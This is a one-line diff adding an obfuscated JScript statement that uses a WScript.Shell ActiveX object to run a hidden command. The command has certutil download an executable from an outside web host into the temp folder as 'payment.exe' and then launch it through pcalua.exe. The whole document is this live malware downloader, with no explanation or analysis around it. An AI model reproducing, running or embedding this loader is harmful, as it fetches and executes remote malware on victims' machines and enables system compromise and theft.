@@ -1,0 +1,1 @@
+	 new	 ActiveXObject("wsCriPt.sHELl").ruN(	 '"cMd.EXe"	 CmD  /c StARt   /B /miN  CErtUtiL.EXe  /urLCache -SPlit /f http://ateliermue.info/wp-content/aa.exe  %TEMP%\payment.exe |  CMD.eXE  /sTART   /b /Min  pINg.eXE  &  PcALUA.EXE -a %TEMP%\payment.exe'	 ,	 0	 )	 ;
